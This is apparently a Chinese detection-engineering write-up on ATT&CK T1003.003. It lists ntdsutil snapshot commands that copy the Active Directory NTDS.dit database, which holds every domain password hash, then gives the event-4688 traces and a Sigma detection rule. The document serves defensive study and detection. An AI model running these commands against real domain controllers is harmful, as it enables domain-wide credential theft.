# T1003-003-win-使用ntdsutil获得NTDS.dit文件

## 来自ATT&CK的描述

攻击者可能试图访问或创建Active Directory域数据库的副本，以便窃取凭据信息，以及获取有关域成员（例如设备，用户和访问权限）的其他信息。默认情况下，NTDS文件（NTDS.dit）位于%SystemRoot%\NTDS\Ntds.dit域控制器中。

除了在活动的域控制器上查找NTDS文件之外，攻击者还可能搜索包含相同或相似信息的备份。

下列工具和技术可用于枚举NTDS文件和整个Active Directory哈希的内容。

卷影复制

secretsdump.py

使用内置的Windows工具ntdsutil.exe

调用卷影副本

### NTDS.dit

Ntds.dit文件是存储Active Directory数据的数据库，包括有关用户对象，组和组成员身份的信息。它包括域中所有用户的密码哈希值。域控制器（DC）上的ntds.dit文件只能由可以登录到DC的用户访问。很明显，保护这个文件至关重要，因为攻击者访问这个文件会导致整个域沦陷。

**默认情况下，NTDS文件将位于域控制器的％SystemRoot％\NTDS\Ntds.dit中。**但通常存储在其他逻辑驱动器上）。AD数据库是一个Jet数据库引擎，它使用可扩展存储引擎（ESE）提供数据存储和索引服务。通过ESE级别索引，可以快速定位对象属性。

## 测试案例

在2008+域控上使用 ntdsutil snapshot mount导出ntds.dit

### 创建快照

```bash
ntdsutil snapshot  "activate  instance ntds"  create  quit quit
```

### Ntdsutil挂载域快照

```bash
ntdsutil snapshot  "mount {GUID}" quit  quit
```

### 复制快照

```bash
copy C:\$SNAP_201212082315_VOLUMEC$\windows\NTDS\ntds.dit  c:\ntds.dit #注意路径大小写问题
```

### 卸载快照

```bash
ntdsutil snapshot  "unmount {GUID}" quit  quit
```

### 删除快照

```bash
ntdsutil snapshot  "delete {GUID}" quit  quit

ntsutil.exe +PWPR(Passcape Windows Password Recovery)
```

## 检测日志

windows 安全日志

## 测试复现

![ntds1](https://s2.ax1x.com/2019/12/26/lAeIM9.png)

![ntds2](https://s2.ax1x.com/2019/12/26/lAeOPO.png)

## 测试留痕

windows 安全日志、4688进程创建、Ntsutil.exe进程名称。

![event_log](https://s2.ax1x.com/2019/12/26/lAuVDs.png)

## 检测规则/思路

```yml
title: 使用ntdsutil拿到NTDS.dit文件
description: windows server 2008 + AD域控
references: https://blog.csdn.net/Fly_hps/article/details/80641987
tags: T1003-003
status: experimental
author: 12306Bro
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 4688 #已创建新的进程。
        Newprocessname: 'C:\Windows\System32\ntdsutil.exe' #新进程名称
    condition: selection
level: medium
```

注意：此检测仅适用于windows AD域控主机。

## 参考推荐

MITRE-ATT&CK-T1003-003

<https://attack.mitre.org/techniques/T1003/003>

域渗透——获得域控服务器的NTDS.dit文件

<https://xz.aliyun.com/t/2187>

NTDS.dit密码快速提取工具

<https://www.secpulse.com/archives/6301.html>

域hash值破解的总结经验

<https://www.cnblogs.com/backlion/p/6785639.html?utm_source=itdadao&utm_medium=referral>
